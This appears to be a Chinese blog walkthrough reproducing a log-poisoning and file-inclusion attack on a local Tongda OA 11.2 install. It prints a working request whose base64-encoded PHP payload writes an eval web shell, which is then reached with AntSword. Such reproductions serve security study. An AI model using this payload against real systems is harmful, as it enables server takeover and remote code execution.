...
1、下载通达OA 11.2，[https://cdndown.tongda2000.com/oa/2019/TDOA11.2.exe，点击安装](https://cdndown.tongda2000.com/oa/2019/TDOA11.2.exe%EF%BC%8C%E7%82%B9%E5%87%BB%E5%AE%89%E8%A3%85)  
![image](https://img2024.cnblogs.com/blog/3630048/202509/3630048-20250913125257889-1786338555.png)  
2\. 随便发一个请求，内含php payload，之后日志文件会自动进行记录。  
payload如下：

    GET /aaaaaa?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?> HTTP/1.1
    Host: localhost
...
路径什么的可以随便填，只要让日志记录到对应的php payload即可。payload的作用是创建一个cmdshell.php，里面是一句话木马`<?php @eval($_POST['cmdshell']);?>`  
![image](https://img2024.cnblogs.com/blog/3630048/202509/3630048-20250913125550073-804232948.png)  
在本地其实可以看到日志如下，已经被成功记录了：  
![image](https://img2024.cnblogs.com/blog/3630048/202509/3630048-20250913125631548-263756220.png)  
3\. 利用文件包含漏洞进行文件包含  
...
![image](https://img2024.cnblogs.com/blog/3630048/202509/3630048-20250913130240258-676281490.png)  
4\. 蚁剑连接  
第三步远程文件包含日志之后已经将php payload执行了，只需要用蚁剑连接即可  
![image](https://img2024.cnblogs.com/blog/3630048/202509/3630048-20250913130436870-54962447.png)